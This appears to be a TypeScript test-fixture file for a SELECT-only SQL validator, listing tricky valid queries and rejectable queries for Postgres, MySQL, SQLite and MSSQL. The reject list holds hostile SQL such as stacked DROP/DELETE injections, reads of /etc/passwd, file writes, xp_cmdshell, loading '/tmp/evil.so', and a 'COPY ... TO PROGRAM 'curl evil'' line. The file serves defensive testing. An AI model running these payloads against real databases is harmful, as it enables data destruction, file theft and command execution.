/** Valid queries whose names, strings and comments look like dangerous keywords. */
export const validEdgeCases: Record<CorpusDialect, string[]> = {
  postgres: [
    "SELECT load, lock, copy, call, comment, analyze_score, \"update\" FROM trucks LIMIT 5",
    "SELECT t.update, t.delete FROM audit t LIMIT 5",
    "SELECT REPLACE(name, 'a', 'b') FROM users LIMIT 5",
    "SELECT id FROM orders WHERE status IN ('drop', 'create', 'delete') LIMIT 5",
    "SELECT $$it's; DROP TABLE x$$ AS s",
    "SELECT E'a\\'; DELETE FROM x' AS s",
    "SELECT 1 /* nested /* comment */ ; DROP */ AS x",
    "(SELECT id FROM a) UNION (SELECT id FROM b) LIMIT 5",
  ],
  mysql: [
    "SELECT 'it\\'s; DROP TABLE x' AS s",
    "SELECT `drop`, `select` FROM t LIMIT 5",
  ],
  sqlite: [
  ],
  mssql: [
    "SELECT [drop], [delete] FROM [t]",
  ],
};

/** Queries a SELECT-only validator must reject. */
export const dangerous: Record<CorpusDialect, string[]> = {
  postgres: [
    "SELECT 1; DELETE FROM users;",
    "SELECT 1; DROP TABLE users",
    "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d",
    "SELECT * INTO backup_users FROM users",
    "SELECT * FROM users FOR UPDATE",
    "SELECT pg_sleep(100)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT lo_export(1, '/tmp/x')",
    "SELECT set_config('role', 'admin', false)",
    "SELECT * FROM dblink('host=x', 'DELETE FROM t') AS t(a int)",
    "COPY users TO PROGRAM 'curl evil'",
    "DO $$ BEGIN DELETE FROM users; END $$",
    "SELECT pg_terminate_backend(123)",
    "UPDATE users SET role = 'admin'",
    "SELECT 1 /* x */; TRUNCATE users",
    "SELECT 1 /* nested /* c */ */; DROP TABLE x",
    "(DELETE FROM users)",
    "WITH x AS (UPDATE users SET a=1 RETURNING *) SELECT * FROM x",
    "SELECT * FROM users FOR NO KEY UPDATE",
    "SELECT E'\\'' ; DROP TABLE x --'",
  ],
  mysql: [
    "SELECT 1; DELETE FROM users;",
    "SELECT * FROM users INTO OUTFILE '/tmp/x'",
    "SELECT LOAD_FILE('/etc/passwd')",
    "SELECT SLEEP(100)",
    "SELECT BENCHMARK(100000000, MD5('x'))",
    "SELECT * FROM users FOR UPDATE",
    "UPDATE users SET role = 'admin'",
    "SELECT 'a\\'; DROP TABLE x; -- '",
  ],
  sqlite: [
    "SELECT 1; DELETE FROM users;",
    "ATTACH DATABASE '/tmp/x.db' AS x",
    "SELECT load_extension('/tmp/evil.so')",
    "PRAGMA writable_schema = 1",
    "UPDATE users SET role = 'admin'",
  ],
  mssql: [
    "SELECT 1; DELETE FROM users;",
    "EXEC xp_cmdshell 'dir'",
    "SELECT * INTO backup_users FROM users",
    "WAITFOR DELAY '00:01:00'",
    "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x;', 'SELECT 1')",
    "UPDATE users SET role = 'admin'",
  ],
};
